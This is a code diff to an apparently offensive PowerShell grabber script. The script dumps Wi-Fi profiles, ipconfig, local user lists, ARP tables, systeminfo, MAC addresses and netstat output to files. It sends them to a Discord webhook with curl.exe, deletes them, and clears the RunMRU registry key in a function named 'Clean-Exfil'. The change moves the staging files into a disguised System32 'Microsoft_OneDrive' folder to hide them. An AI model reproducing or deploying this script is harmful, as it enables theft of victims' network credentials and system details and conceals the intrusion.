@@ -22,13 +22,13 @@ return $WLANProfileObjects
 }
 $Networks = Get-Networks
 
-Get-Networks | Out-File -FilePath $env:TMP\WIFI-INFO.txt
-ipconfig /all | Out-File -FilePath $env:TMP\ipconfig.txt
-net user | Out-File -FilePath $env:TMP\users.txt
-arp -a | Out-File -FilePath $env:TMP\arp.txt
-systeminfo | Out-File -FilePath $env:TMP\systeminfo.txt
-getmac /v | Out-File -FilePath $env:TMP\mac.txt
-netstat -aon | Out-File -FilePath $env:TMP\netstat.txt
+Get-Networks | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt
+ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
+net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
+arp -a | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt
+systeminfo | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
+getmac /v | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
+netstat -aon | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
 
 
 
@@ -54,20 +54,20 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-Upload-Discord -file $env:TMP\WIFI-INFO.txt
-Upload-Discord -file $env:TMP\ipconfig.txt
-Upload-Discord -file $env:TMP\users.txt
-Upload-Discord -file $env:TMP\arp.txt
-Upload-Discord -file $env:TMP\systeminfo.txt
-Upload-Discord -file $env:TMP\mac.txt
-Upload-Discord -file $env:TMP\netstat.txt
-rm "$env:TMP\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\users.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\arp.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\mac.txt" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\netstat.txt" -r -Force -ErrorAction SilentlyContinue
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt" -r -Force -ErrorAction SilentlyContinue
 function Clean-Exfil { 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
